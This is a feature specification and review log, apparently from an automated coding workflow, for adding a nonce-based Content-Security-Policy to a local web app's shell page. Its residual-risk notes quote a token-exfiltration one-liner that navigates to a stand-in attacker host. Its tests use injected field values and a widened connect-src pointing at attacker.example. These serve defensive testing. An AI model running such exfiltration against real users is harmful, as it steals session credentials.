---
title: 'DW-2 — Strict Content-Security-Policy on the app shell (nonced inline token script)'
type: 'feature'
created: '2026-07-22'
status: 'done'
baseline_revision: '24e9929'
final_revision: '7b8fff5'
review_loop_iteration: 0
followup_review_recommended: true
context: []
warnings: [oversized]
---

<intent-contract>

## Intent

**Problem:** The token-bearing app shell (`GET /` / `GET /index.html`) is served with no Content-Security-Policy at all — `htmlHeaders` sets only content-type / `no-store` / `nosniff`. Now that Epic 3/5 render real database content, a stored-XSS in rendered DB data would run with full ambient authority and could read `window.__QS_TOKEN__` and reach `/rpc`.

**Approach:** Serve a strict, per-boot CSP as an HTTP **response header** on the app shell, with a per-boot CSPRNG nonce on the three inline `<script>` tags `renderIndexHtml` emits. The policy is derived from a verified inventory of what Ring 2 actually loads, so it is strict without breaking the running UI.

## Boundaries & Constraints

**Always:**
- Deliver the shell CSP as an **HTTP header**, never `<meta>` — `frame-ancestors` is silently ignored in `<meta>` (the recorded Story 6.4 lesson).
- The nonce is minted **once per boot** (the shell HTML is a boot-time template, `no-store`), from `crypto.getRandomValues` lowercase hex, mirroring `mintSessionToken`. Never logged, never persisted.
- The nonce goes on **all three** inline scripts (`__QS_TOKEN__`, `__QS_EXPOSURE__`, `__QS_SANDBOX_ORIGIN__`) — all three are inline and all three must keep executing.
- `frame-src` must admit the Ring 3 sandbox origin **verbatim as injected** (a different loopback port ⇒ a different origin), or the Ring 2 → Ring 3 loop breaks.
- Pure exported builders (`shellCspHeaders`), mirroring `sandboxCspHeaders()`, so the exact header set is unit-testable without a live server.
- Every directive carries a prose justification in the JSDoc above the constant, per repo convention.
- Fail **closed** on malformed input: never emit a syntactically invalid CSP source token.

**Block If:**
- A directive verified as required here (`style-src 'unsafe-inline'`, `frame-src <sandboxOrigin>`) turns out to be insufficient AND the only fix would weaken `script-src` to `'unsafe-inline'`/`'unsafe-eval'` — that contradicts the recorded decision and needs a human.

**Never:**
- Do NOT add `'unsafe-eval'` or `'unsafe-inline'` to `script-src` — verified unnecessary (no `eval`, no `new Function`, no `Worker` anywhere in `src/ui`, `src/shared`, `src/core`, or the built `ui-bundle.generated.ts`).
- Do NOT change `liveHtmlHeaders`, `LIVE_REPORT_CSP`, `SNAPSHOT_CSP`, or `GUEST_CSP` (AD-3 pins the Ring 3 policy).
- Do NOT touch the `/live/<id>` served page, the `/live/` 404 page, or the JS/CSS asset routes.
- Same-machine token scraping (the other half of the DW-2 ledger text) is explicitly OUT of scope.
- Do not edit `deferred-work.md`.

## I/O & Edge-Case Matrix

| Scenario | Input / State | Expected Output / Behavior | Error Handling |
|----------|--------------|---------------------------|----------------|
| Shell served | `GET /` on a booted Core | 200 + `content-security-policy` containing `default-src 'self'`, `script-src 'self' 'nonce-<hex>'`, `style-src 'self' 'unsafe-inline'`, `img-src 'self' data:`, `connect-src 'self'`, `frame-src <sandboxOrigin>`, `object-src 'none'`, `base-uri 'none'`, `form-action 'none'`, `frame-ancestors 'none'`; plus `x-frame-options: DENY`; existing `no-store` + `nosniff` preserved | No error expected |
| Alias path | `GET /index.html` | Byte-identical headers and body to `GET /` | No error expected |
| Nonce ↔ body agreement | `GET /` | All three inline `<script nonce="…">` carry the SAME hex as the header's `'nonce-…'` source | No error expected |
| Per-boot uniqueness | Two `startCore(0)` boots | Different nonces; a nonce from boot A never appears in boot B's shell | No error expected |
| Unusable sandbox origin | `shellCspHeaders(nonce, "")` (or any non-`http(s)://` value) | `frame-src 'none'` — never an empty or malformed source token | Fail closed |
| Malformed nonce | `shellCspHeaders("zz;evil", …)` / `renderIndexHtml(…, "zz;evil")` | Non-hex chars filtered out; if nothing remains, `script-src` carries NO `'nonce-'` source and the HTML emits NO `nonce` attribute — the header stays well-formed | Fail closed |
| Live Report untouched | `GET /live/<id>` | Headers unchanged: `frame-ancestors 'none'` only, no shell CSP leaked onto it | Regression guard |

</intent-contract>

## Code Map

- `src/core/auth.ts` -- home of `mintSessionToken` (CSPRNG → lowercase hex); the new `mintCspNonce` belongs here.
- `src/core/server.ts` -- `htmlHeaders` / `liveHtmlHeaders` (l.92-111), `renderIndexHtml` (l.209-232), the `GET /` + `/index.html` branch (l.535-537), and `startCore`'s boot-time template render (l.727-731).
- `src/core/sandbox-server.ts` -- prior art: `GUEST_CSP` + the pure `sandboxCspHeaders()` builder (l.62-77). Match its shape and comment density.
- `src/ui/sandbox/sandbox-host.ts` -- `buildSandboxIframeAttrs` (l.78-81): the same `^https?://` guard the `frame-src` fallback must mirror.
- `src/ui/report/report-markdown.ts` -- l.47-52 asserts "a report renders in Ring 2 with **no CSP**"; that claim goes stale with this change.
- `src/core/server.test.ts` -- `describe("renderIndexHtml exposure injection")` (l.541+) calls `renderIndexHtml` with 3 args and must be updated; header-assertion style at l.622-632.
- `src/core/sandbox-server.test.ts` -- per-directive `.toContain()` assertion style to copy (l.53-63).
- `src/core/auth.test.ts` -- existing `mintSessionToken` tests; add the nonce tests alongside.

## Tasks & Acceptance

**Execution:**
- [x] `src/core/auth.ts` -- add `mintCspNonce()`: 16 CSPRNG bytes → lowercase hex, same loop style as `mintSessionToken`; JSDoc states per-boot, in-memory, never logged/persisted -- the nonce needs the same provenance guarantees as the token.
- [x] `src/core/server.ts` -- add a documented `shellCspHeaders(nonce: string, sandboxOrigin: string): Record<string, string>` pure exported builder that composes the directive list from the matrix (hex-filter the nonce; `frame-src` = `sandboxOrigin` only when it matches `^https?://`, else `'none'`), returning it merged over `htmlHeaders` plus `x-frame-options: DENY` -- one place owns the policy, unit-testable without a server.
- [x] `src/core/server.ts` -- add a required 4th `nonce` parameter to `renderIndexHtml` and emit `nonce="<filtered hex>"` on all three inline `<script>` tags (attribute omitted entirely when the filtered nonce is empty) -- the header's nonce is inert unless the tags carry it.
- [x] `src/core/server.ts` -- in `startCore`, mint the nonce next to the token, pass it into `renderIndexHtml`, precompute `const shellHeaders = shellCspHeaders(nonce, sandboxOrigin)` after `sandboxOrigin` is known, and serve it on the `GET /` + `/index.html` branch in place of `htmlHeaders`. Leave `htmlHeaders` (still used by the `/live/` 404 page) and `liveHtmlHeaders` untouched -- the live page keeps its own contract.
- [x] `src/ui/report/report-markdown.ts` -- correct the l.47-52 comment: Ring 2 now DOES carry a CSP (`img-src 'self' data:` blocks remote image egress), so the `isSafeUrl` image guard is now defense-in-depth rather than the sole barrier -- keep the security prose factually true.
- [x] `src/core/auth.test.ts` -- unit-test `mintCspNonce`: 32 lowercase hex chars, matches `/^[0-9a-f]{32}$/`, and two calls differ.
- [x] `src/core/server.test.ts` -- update the four existing `renderIndexHtml(...)` calls to the new 4-arg signature (assertions otherwise unchanged), and add tests covering every row of the I/O matrix: the served `GET /` header (per-directive `.toContain()`), the `/index.html` alias, header↔body nonce agreement, per-boot uniqueness across two `startCore` instances, the `frame-src 'none'` and empty-nonce fail-closed rows against the pure `shellCspHeaders` builder, preservation of `cache-control: no-store` + `nosniff` on the shell, and the `GET /live/<id>` regression guard proving the shell CSP did not leak onto it.

**Acceptance Criteria:**
- Given the running UI, when the shell loads under the new CSP, then `/app.js`, `/app.css`, the three nonced inline scripts, the runtime `<style>` elements injected by CodeMirror's `style-mod` / `react-resizable-panels` / Radix's `react-style-singleton`, CodeMirror's `.cm-highlightTab` `data:image/svg+xml` background, the sandbox iframe, and the `/rpc` + `/chat/stream` + `/snapshot-runtime.js` + `/live-report-runtime.js` fetches (including the `beforeunload` synchronous XHR to `/rpc`) are all still permitted — nothing in Ring 2 is blocked.
- Given `bunx tsc --noEmit`, `bun test`, and `bun run build`, when run, then all three pass and the suite grows strictly additively (baseline at `24e9929`: `1526 pass / 0 fail across 76 files`); no existing assertion is weakened or deleted beyond the mechanical 4-arg `renderIndexHtml` signature update.
- Given the CSP header string, when parsed, then it contains no whitespace-broken or empty source token in any directive, under every matrix input.

## Spec Change Log

_No spec amendments. No finding was rooted in the spec; every confirmed finding was a localized code or test defect fixable without re-derivation._

## Review Triage Log

### 2026-07-22 — Review pass

- intent_gap: 0
- bad_spec: 0
- patch: 13: (high 0, medium 5, low 8)
- defer: 1: (high 0, medium 1, low 0)
- reject: 4: (high 0, medium 2, low 2)
- addressed_findings:
  - `[medium]` `[patch]` `shellCspHeaders` gated the nonce source on `length > 0`, so a partially-filtered input (`"ab;evil cd"` → `'nonce-abecd'`) shipped as a live 20-bit nonce — only the all-or-nothing corner failed closed. Now the source is emitted only for exactly the 32-hex shape `mintCspNonce` produces.
  - `[medium]` `[patch]` The nonce filter was duplicated across `shellCspHeaders` and `renderIndexHtml` while the JSDoc claimed "the two can never disagree" — copy-paste, not construction. Extracted one shared `safeCspNonce` helper used by both, plus a paired test feeding identical inputs to both sides.
  - `[medium]` `[patch]` The `connect-src` rationale claimed the CSP leaves an injected script "nowhere off-machine to send" the token. False: scripted top-level navigation (`location.href`, `window.open`) still exfiltrates, since `navigate-to` was removed from CSP and `form-action` does not cover it. Rewritten accurately, with the residual recorded as the app-shell twin of the accepted DW-47 sandbox residual.
  - `[medium]` `[patch]` On an IPv6 bind, `frame-src` carries `http://[::1]:<port>`, which is formally outside CSP3's `host-part` grammar (Chromium/Gecko accept it; a spec-strict browser would refuse the Ring 3 iframe). The emitted value is unchanged — it must stay byte-identical to the iframe `src`, and no portable CSP spelling for an IPv6 origin exists — but the residual is now documented and pinned by a test.
  - `[medium]` `[patch]` `^https?://` admitted hostless origins (`"http://"`, `"http:///x"`), producing the invalid source `frame-src http://`. Tightened to require a host, so those fall through to `frame-src 'none'`.
  - `[low]` `[patch]` `src/ui/report/report-markdown.ts`'s rewritten comment justified the image guard as "the only guard that survives outside the shell" — inverted: the exported Snapshot and Live Report both carry `default-src 'none'` with no `img-src`, blocking images *more* strictly. Rewritten around the real reason (URL neutralization at render time does not depend on CSP delivery or browser support).
  - `[low]` `[patch]` `expectWellFormed`'s per-directive regex accepted any non-empty token, so it green-lit duplicated and typo'd directive names — both silently dropped by browsers — while its docblock claimed to own that whole bug class. Tightened with a no-duplicate-name check and an explicit directive-name allowlist.
  - `[low]` `[patch]` The `'unsafe-inline'` and remote-`img-src` negative assertions were substring-shaped and did not hold their invariant (`script-src 'self' 'nonce-…' 'unsafe-inline'` passed). Replaced with directive-scoped regexes.
  - `[low]` `[patch]` The `/index.html` "byte-identical headers" test compared four headers, not the header set. Now compares the full sorted header lists.
  - `[low]` `[patch]` No test tied the mint to its consumers, so a future change to the nonce format would white-screen the app silently instead of failing the suite. Added the mint↔consumer contract test.
  - `[low]` `[patch]` The ~55-line policy rationale sat on `SHELL_CSP_LEADING_DIRECTIVES`, a misnamed constant holding one directive, while the directives it explained lived elsewhere under one-line comments — an editor loosening `img-src` would never see the reasoning. Rationale redistributed onto the constants that actually carry each directive.
  - `[low]` `[patch]` `mintCspNonce` was a verbatim clone of `mintSessionToken`; a hardening fix to one would miss the other. Both now call a shared `randomHex`.
  - `[low]` `[patch]` `auth.test.ts`'s "two boots never share a nonce" performed zero boots, and its comment inverted what a repeat would prove. Names and comments corrected to describe what is actually asserted; no assertion weakened.

**Deferred (1) — NOT written to the ledger.** The invocation explicitly instructed this run not to edit `deferred-work.md`; the orchestrator owns ledger writes. Recording it here for the orchestrator to file:

- source_spec: `spec-dw-2-csp-app-shell-hardening.md`
  summary: A stored-XSS in rendered DB content can still exfiltrate the per-boot session token via scripted top-level navigation (`location.href = "https://evil.tld/?t=" + window.__QS_TOKEN__`), which the new app-shell CSP does not block.
  evidence: `connect-src 'self'` closes only fetch/XHR/WebSocket/EventSource. The `navigate-to` directive that would have covered scripted navigation was removed from CSP and ships in no browser, and `form-action` does not apply to scripted navigation. This is the app-shell twin of the residual already accepted for the Ring 3 sandbox in DW-47; unlike DW-47 it has never been recorded or decided for the shell.

**Rejected (4):** the two adjacent positional `string` params on `renderIndexHtml` (a swap is already caught by the existing served-shell header↔body agreement test, and an options-object refactor is disproportionate); exposed-mode `frame-src` pointing at the client's own loopback (pre-existing in the injected `__QS_SANDBOX_ORIGIN__` and already decided in DW-48, which accepted that visualizations render only on the host machine); the nonce being per-boot rather than per-response (the recorded user decision specifies a per-boot nonce, and a client that can read `GET /` already holds the token); and `about:blank` under `frame-src 'none'` (browsers do not gate `about:blank` iframe navigation, and that branch only runs when the sandbox origin is already unusable).

### 2026-07-22 — Review pass (follow-up)

- intent_gap: 0
- bad_spec: 0
- patch: 8: (high 0, medium 4, low 4)
- defer: 2: (high 0, medium 2, low 0)
- reject: 4: (high 0, medium 1, low 3)
- addressed_findings:
  - `[medium]` `[patch]` Every POSITIVE CSP assertion was an unanchored `.toContain()`, so the suite placed no upper bound on what any directive permitted. Reproduced by both this pass and the reviewer: widening `default-src` to `'self' *` and `connect-src` to `'self' https://attacker.example` left the whole file green. The `expectWellFormed` helper now pins all ten boot-independent directives to their EXACT full value, and the two boot-dependent ones (`script-src`, `frame-src`) are pinned with `toBe`/anchored regex at every call site. The same mutation now fails 9 tests.
  - `[medium]` `[patch]` `expectWellFormed`'s docblock claimed to be "an allowlist, not a spot-check" while allowlisting only directive NAMES — it constrained no source list at all, which is what let the finding above survive. It now asserts value-exactness too, and its docstring describes what it actually enforces.
  - `[medium]` `[patch]` The `frame-src` gate `/^https?:\/\/[^/]/` admitted authorities with an EMPTY host — `http://:1234`, `http://[:]:80`, `http://.:80`, `http://[` — emitting a source expression no browser can parse, in the one directive whose failure mode is a silently-dropped policy. Replaced with an anchored `scheme://host[:port]` rule that requires a real host (bracketed IPv6 included), and every one of those forms is now in the fail-closed matrix.
  - `[medium]` `[patch]` `shellCspHeaders` and `buildSandboxIframeAttrs` had genuinely DIVERGED — `^https?://[^/]` in Ring 1 vs `^https?://` in Ring 2 — while a comment in each file asserted they matched. Executed against the eight-value matrix, three inputs produced `frame-src 'none'` alongside an iframe pointed at the literal hostless string. Both now call one shared `isUsableSandboxOrigin`, and the agreement is pinned by paired tests over one shared matrix instead of asserted by prose.
  - `[low]` `[patch]` The sandbox-origin charset filter was two literal copies of the same regex (`shellCspHeaders` and `renderIndexHtml`) — in the same file whose nonce docstring argues at length that the two consumers of a must-match value share one function rather than two synced regexes. Extracted to the shared `sanitizeSandboxOrigin`.
  - `[low]` `[patch]` The fail-closed rationale described the degraded boot as "blank UI, loud, safe". It was blank and safe but entirely silent — the only signal was a browser console. `startCore` now emits a `console.warn` on each degraded branch (nonce rejected / sandbox origin unusable), never printing the nonce value.
  - `[low]` `[patch]` `mintCspNonce`'s docstring listed "never logged, never persisted, never returned on the public `Core` surface" beside the session token's guarantees and framed the threat as guessing, implying a secrecy the deployment does not provide: the shell is served at the UNGATED `GET /`, so any local process can read the boot's nonce out of the HTML. The docstring now states that limit explicitly and points at DW-2's still-open same-machine carve-out.
  - `[low]` `[patch]` `expectWellFormed`'s "every directive needs ≥1 source" rule was presented as CSP well-formedness, which it is not — valueless directives like `upgrade-insecure-requests` are valid CSP. Scoped the claim to this policy rather than loosening the check.

**Deferred (2)** — both appended to `deferred-work.md` as NEW entries (no existing entry touched): the scripted-top-level-navigation token exfiltration residual carried over from the first pass (recorded in the spec then, unfiled because that run was told not to write the ledger), and the absence of any mechanism that re-verifies the Ring 2 resource inventory the `'none'` directives are justified by.

**Rejected (4):** the exposed-mode / wildcard-bind `frame-src` pointing at the viewer's own loopback (already a recorded user decision in DW-48: keep the sandbox loopback-only, document that visualizations render on the host machine only); the swap hazard on `renderIndexHtml`'s adjacent positional `string` params (mutation-tested this pass — swapping `token` and `cspNonce` at the call site fails 2 served-shell tests, so the class is caught); the `mintCspNonce` tests not constraining the entropy SOURCE (asserting `crypto.getRandomValues` is called would mean cutting an injection seam into a security primitive to test a line `tsc` already pins, for no reachable failure); and the per-boot-uniqueness test's cost (`startCore(0)` is the established pattern in this file, and per-boot freshness is not provable without a second boot).

### 2026-07-22 — Review pass (third)

- intent_gap: 0
- bad_spec: 0
- patch: 8: (high 0, medium 3, low 5)
- defer: 2: (high 0, medium 1, low 1)
- reject: 3: (high 0, medium 0, low 3)
- addressed_findings:
  - `[medium]` `[patch]` `sanitizeSandboxOrigin` REPAIRED a hostile value into a valid origin and the gate then judged the survivors — the exact fail-open shape `safeCspNonce`'s own docstring spends 20 lines rejecting for the nonce, and worse here, because the repaired value can be a different, fully valid, REMOTE origin. Executed: `"http://evil.test\:6789"` → `frame-src http://evil.test:6789` plus a matching injected global and iframe `src`; `"http://127.0.0.1:67'89"` → a port the input never denoted. The filter is deleted: the gate now decides accept-or-reject on the RAW value, and the previously-passing repair path fails 1 test as a mutation.
  - `[medium]` `[patch]` The "one function, one rule, both rings, cannot reach different verdicts" claim was still false — `shellCspHeaders` gated `isUsableSandboxOrigin(sanitize(x))` while `buildSandboxIframeAttrs` gated `isUsableSandboxOrigin(x)`, violating the shared module's own written contract. Executed, three inputs put `frame-src http://127.0.0.1:6789` in the header against an `about:blank` iframe. The previous pass moved the shared GATE and left the PIPELINE asymmetric; both sides now gate the same raw value, and the shared-fixtures matrix gained the repairable-hostile class that made the asymmetry invisible.
  - `[medium]` `[patch]` The removed filter was untested at both call sites: deleting `sanitizeSandboxOrigin` from `shellCspHeaders` or from `renderIndexHtml` left `1551 pass / 0 fail`, because the one hostile fixture failed the gate anyway and `scriptJson` already escaped `<`. Replaced by `REPAIRABLE_HOSTILE_SANDBOX_ORIGINS` — seven values that differ from a real origin only by filterable characters — asserted against the header, the injected global and the gate.
  - `[low]` `[patch]` The host grammar admitted more than the ONE documented CSP3 deviation: `http://my_host:5555`, `http://a..b:80`, `http://a-.:80`, `http://xn--x.:80` and `http://[1.2.3.4]:80` all passed, and `QS_HOST` reaches the gate, so `QS_HOST=my_host` emitted an unparseable `frame-src` source. Tightened to real dot-separated labels plus a bracketed IPv6 literal (colon AND hex digit required), leaving IPv6 as the single documented deviation instead of an open-ended class. Loosening it back fails 3 tests.
  - `[low]` `[patch]` Nothing pinned the entropy SOURCE: replacing `crypto.getRandomValues` with `Math.random` inside the now-shared `randomHex` left the suite green and `tsc` silent — refuting the previous pass's rejection rationale ("a line `tsc` already pins") by execution, and made worse by the sharing, since one edit degrades both the 256-bit token and the 128-bit nonce. Added a `spyOn(crypto, "getRandomValues")` test asserting both mints call it with the right byte widths — no injection seam cut into the primitive.
  - `[low]` `[patch]` `expectWellFormed` still left the two BOOT-DEPENDENT directives unbounded, so two of its six call sites pinned only `frame-src` and would have passed against `script-src 'self' 'unsafe-inline'`. Both are now shape-pinned (`'self'` plus at most one full-width nonce; `'none'` or exactly one `scheme://host`) in every call.
  - `[low]` `[patch]` The `worker-src`/`object-src`/`form-action` justification cited a mechanical check that does not reproduce: grepping the built bundle for those tag names returns hits (React-DOM's internal tag tables, Radix's `NODES` list). The comment now states what was actually verified and why grepping the artifact is not that check — a security directive's stated basis must be re-runnable.
  - `[low]` `[patch]` Two test-hygiene defects: `expect(nonce).not.toBe(core.token)` cannot fail (32-hex vs 64-hex, different widths by construction) while claiming to guard the token/nonce swap — replaced with an assertion that the token leaks into NO response header; and `not.toContain(";;")` was strictly subsumed by the `/;\s*;/` line beside it — dropped.

**Deferred (2)** — both appended to `deferred-work.md` as NEW entries, no existing entry touched: `/live/<id>` still serving the same session token under `script-src 'unsafe-inline'` (out of DW-2's scope by its own Never clause, AD-3 pins that policy), and the `/live/` 404 page being the last HTML route with no CSP and no `x-frame-options` at all.

**Rejected (3):** the two unreachable `console.warn` fail-closed diagnostics being untested (both branches are unreachable by construction — `mintCspNonce` always mints and `deriveOpenUrl` always yields an authority — so testing them means cutting a seam into boot for a diagnostic whose only job is to exist if a future regression makes a branch reachable); the absence of an in-page boot-failure renderer for the "inline bootstrap refused" state (a new UI surface for a state the nonce contract makes unreachable, and a feature rather than a fix); and a trailing-slash sandbox origin regressing to `about:blank` (`deriveOpenUrl` emits no trailing slash, and the reviewer filed it at low confidence itself).

## Design Notes

The exact policy (order mirrors `GUEST_CSP`):

```
default-src 'self'; script-src 'self' 'nonce-<hex>'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src <sandboxOrigin>;
worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

Why each non-obvious directive, from the verified inventory:
- `style-src 'unsafe-inline'` — 47 React `style={{…}}` props plus 4 direct `.style.x =` writes produce style **attributes**, which a nonce can never cover; and three separate libraries inject `<style>` tags at runtime (CodeMirror's `style-mod`, `react-resizable-panels`' cursor style, Radix's `react-style-singleton` scroll-lock). The tighter `style-src 'nonce-…'; style-src-attr 'unsafe-inline'` form was REJECTED: it requires wiring a nonce into all three injectors (`EditorView.cspNonce`, two distinct `setNonce()` APIs), and missing any one silently breaks editor theming / panel resize / dialog scroll-lock. `'unsafe-inline'` is honored here only because `style-src` carries no nonce/hash.
- `img-src data:` — CodeMirror's `.cm-highlightTab` base theme uses a `url('data:image/svg+xml,…')` background. Safe to allow: `report-markdown.ts` already rewrites every scheme-bearing image `src` to `#`.
- `frame-src <sandboxOrigin>` — the sandbox is a distinct **port**, so `default-src 'self'` would block it. The `about:blank` fallback `buildSandboxIframeAttrs` emits inherits the embedder policy and needs no source. `child-src` is deliberately NOT duplicated: every browser that understands nonces also understands `frame-src`, and a second copy of the origin is a drift hazard in a security control.
- `worker-src 'none'` / `object-src 'none'` / `form-action 'none'` — verified zero `new Worker`/`<object>`/`<form>` in source and in `ui-bundle.generated.ts`.
- No `'unsafe-eval'` — zero `eval`/`new Function`/`Function("…")` anywhere (CodeMirror 6, not Monaco; micromark, not MDX).
- `font-src 'self'` — system font stacks only, zero `@font-face` in the built CSS.
- Not CSP-gated, so deliberately unprovisioned: the blob `a[download]` exports (`export-snapshot.ts:121`, `TabContent.tsx:282`) are downloads, not resource loads; and the Live Report export's `window.open("about:blank")` + `location.href = "/live/<id>"` is a same-origin popup navigation.

The sandbox origin is accepted or rejected WHOLE (`isUsableSandboxOrigin` on the raw value), never character-filtered: the accepted grammar admits no `;`, space or quote, so injection into `frame-src` is impossible, and — unlike a filter — a hostile value cannot be repaired into a different valid origin that every ring then agrees on. The nonce gate is the same all-or-nothing rule for `script-src`. _(Third review pass: this paragraph originally described a charset filter, which is what was found to fail open; the note is corrected here to keep the design record true — the intent contract is untouched.)_

## Verification

**Commands:**
- `bunx tsc --noEmit` -- expected: no diagnostics, exit 0; in particular every `renderIndexHtml` call site (source + tests) satisfies the new 4-arg signature.
- `bun run build` -- expected: all four bundles rebuild cleanly.
- `bun test` -- expected: 0 fail, total strictly greater than the `1526 pass / 76 files` baseline.

**Manual checks (if no CLI):**
- There is no headless-browser harness in this repo, so no automated test can prove the live UI renders under the policy. Re-read the final CSP string against the Design Notes inventory and confirm every listed consumer (inline `<style>` injection, `data:` cursor, cross-port iframe, same-origin `fetch`) has a matching directive before declaring done.

## Auto Run Result

Status: done

### Implemented change

`GET /` and `GET /index.html` now serve a strict, per-boot Content-Security-Policy as an HTTP **response header**, with a 128-bit CSPRNG nonce on the three inline `<script>` tags that hand the UI its token, exposure payload, and sandbox origin. The policy was derived from a verified inventory of what Ring 2 actually loads at runtime, not from a template — which is what let it stay strict (`default-src 'self'`, no `'unsafe-eval'`, no inline script without the nonce) without breaking the running app.

Final policy:

```
default-src 'self'; script-src 'self' 'nonce-<32-hex>'; style-src 'self' 'unsafe-inline';
img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src <sandboxOrigin>;
worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

Plus `x-frame-options: DENY`, on top of the unchanged content-type / `cache-control: no-store` / `x-content-type-options: nosniff` contract.

Three directives were load-bearing discoveries, each of which a naive `default-src 'self'` would have broken: `style-src 'unsafe-inline'` (47 React `style={{…}}` props and 4 direct `.style.x =` writes produce style *attributes* no nonce can cover, plus three libraries that inject `<style>` at runtime); `frame-src <sandboxOrigin>` (the Ring 3 sandbox is a different loopback **port**, so a different origin); and `img-src data:` (CodeMirror's `.cm-highlightTab` background).

### Files changed

- `src/shared/sandbox-origin.ts` — **new.** The single rule for the sandbox origin, imported by all three consumers: `isUsableSandboxOrigin`, an anchored `scheme://host[:port]` gate applied to the RAW value. Added by the follow-up review (the two consumers had diverged); reduced to one accept-or-reject function by the third review, which found the companion charset filter repaired hostile values into valid — sometimes fabricated and remote — origins.
- `src/core/auth.ts` — new `mintCspNonce()` (128-bit CSPRNG lowercase hex); both mints now share one private `randomHex(byteLength)` primitive. Its docstring states what the per-boot guarantees do NOT provide (secrecy from a local process reading the ungated `GET /`).
- `src/core/server.ts` — the policy spine split across three documented constants, a pure exported `shellCspHeaders(nonce, sandboxOrigin)` builder, one shared `safeCspNonce` gate, a 4th `nonce` parameter on `renderIndexHtml`, per-boot wiring in `startCore`, and a boot-time `console.warn` on either fail-closed branch. Both origin consumers gate the raw value through the shared rule; a rejected origin is emitted as `frame-src 'none'` and injected as `""`. `htmlHeaders` and `liveHtmlHeaders` untouched.
- `src/ui/sandbox/sandbox-host.ts` — `buildSandboxIframeAttrs` gates on the shared `isUsableSandboxOrigin` instead of its own `^https?://`, so a hostless origin falls back to `about:blank` exactly when the CSP emits `frame-src 'none'` — over the same raw input Ring 1 gates, which is what the third review had to fix to make the claim true.
- `src/ui/report/report-markdown.ts` — comment only: the `isSafeUrl` image guard's justification corrected now that Ring 2 carries a policy.
- `src/shared/sandbox-origin.test.ts`, `src/shared/sandbox-origin.fixtures.ts` — **new.** The authoritative origin matrix (15 unusable / 6 usable) plus the sanitizer and gate tests; the fixtures module is what `server.test.ts` and `sandbox-host.test.ts` both assert against, so the three cannot drift into testing three different matrices.
- `src/core/auth.test.ts`, `src/core/server.test.ts`, `src/ui/sandbox/sandbox-host.test.ts` — nonce mint tests, the full `app-shell CSP (DW-2)` suite covering every I/O-matrix row, exact per-directive pinning, and the paired cross-ring agreement tests.

### Review findings

Three review passes. **First pass:** 13 patches applied, 1 deferred, 4 rejected. **Follow-up pass:** 8 patches, 2 deferred, 4 rejected. **Third pass:** 8 patches, 2 deferred, 3 rejected. Across all three: 0 intent gaps, 0 spec amendments. See the Review Triage Log above for the itemized breakdown and rationale.

Each pass found the previous pass's fix incomplete in the same place, which is the story of this change: the follow-up pass moved the sandbox-origin GATE into one shared module and declared the two rings unified; the third pass found the two rings still ran that one gate over two different INPUTS — Ring 1 over a character-filtered value, Ring 2 over the raw one — and, worse, that the filter could repair a hostile string into a valid, fabricated, remote origin all three consumers then agreed on. Deleting the filter (accept-or-reject on the raw value) is what finally makes "one function, one rule, both rings" a true sentence rather than a comment, and the mutation that reintroduces the filter now fails the suite.

### Verification performed

- `bunx tsc --noEmit` — exit 0, no diagnostics.
- `bun test` — **1551 pass / 0 fail / 9271 expect() across 77 files** (baseline at `24e9929`: 1526 / 76; after pass 1: 1544 / 76; after pass 2: 1551 / 8545 expect()). The third pass added assertions rather than test cases and replaced three tests of the deleted sanitizer with three over the raw-value gate, so the case count is flat and the expectation count is up ~730.
- `bun run build` — all four bundles regenerated cleanly; the built UI bundle carries the new shared gate.
- Mutation-checked, first pass: duplicating `img-src` with `https:` fails 8 tests; reverting the nonce gate to the old filter fails 2.
- Mutation-checked, follow-up pass: widening `default-src` to `'self' *` and `connect-src` to `'self' https://attacker.example` fails 9 tests (it failed 0 before that pass); swapping `token` and `cspNonce` at the `renderIndexHtml` call site fails 2.
- Mutation-checked, third pass — every one of these left the suite fully green BEFORE this pass: reintroducing the strip-and-keep origin filter fails 1; loosening the host grammar back to `[A-Za-z0-9][A-Za-z0-9._-]*` fails 3; swapping `crypto.getRandomValues` for `Math.random` in the shared `randomHex` fails 1 (and `tsc` still passes, which is precisely why the test was needed). Widening `connect-src` was re-run and still fails 9, confirming the previous pass's pins survived this refactor.
- Manual: no headless-browser harness exists, so the live render under the policy was verified by re-reading the final CSP against the runtime inventory rather than by executing the UI. Both review agents independently re-ran that inventory against the built bundle and confirmed it accurate today; that it is not MECHANICALLY re-verified is a filed ledger entry.

### Residual risks

1. **Token exfiltration via scripted navigation is NOT closed** — now filed in `deferred-work.md`. `connect-src 'self'` stops fetch/XHR/WebSocket/EventSource; it does not stop `location.href = "https://evil.tld/?t=" + token`. The `navigate-to` directive that would cover it was removed from CSP and ships in no browser. This is the app-shell twin of the residual already accepted for the sandbox in DW-47, and it has never been decided for the shell. The CSP still raises the bar — silent background exfiltration becomes a visible navigation — but does not eliminate the risk.
2. **IPv6 binds.** On `QS_HOST=::1` / `::`, `frame-src` carries `http://[::1]:<port>`, which is formally outside CSP3's `host-part` grammar though Chromium and Gecko accept it. A spec-strict browser would refuse the Ring 3 iframe: a blank preview pane, never a security hole. No portable CSP spelling for an IPv6 origin exists, so the value is emitted unchanged and the residual is documented and pinned by a test (the shared gate admits bracketed IPv6 literals precisely so the emitted value stays byte-identical to the iframe `src`). The third review pass made this the ONLY such deviation: every other host form outside `host-part` — `_` in a label, empty or trailing labels, a bracketed IPv4 — is now rejected rather than emitted, so `QS_HOST=my_host` fails closed to `frame-src 'none'` instead of emitting a source no browser can parse.
3. **No browser-level proof** — now filed in `deferred-work.md`. The policy's compatibility with the live UI rests on static inventory, not execution. A future dependency that injects a `<script>`, spawns a `Worker`, or fetches off-origin would break at runtime with only a console message — nothing in `bun test` would catch it. The ledger entry notes the mechanically-closable half: a test that greps the built bundles for the constructs each `'none'` directive claims are absent.
4. **The other two HTML routes are now the weak ones** — both filed in `deferred-work.md` by this pass, both excluded by DW-2's own intent contract. `/live/<id>` carries the SAME session token under `script-src 'unsafe-inline'`, so an injection there has the authority the shell no longer grants; and the `/live/` 404 page is served with bare `htmlHeaders` — no CSP, no `x-frame-options`. Neither is exploitable through a path this change opened, and the 404 body is a static literal, but hardening the shell has made them the relatively softest targets rather than leaving them equal.
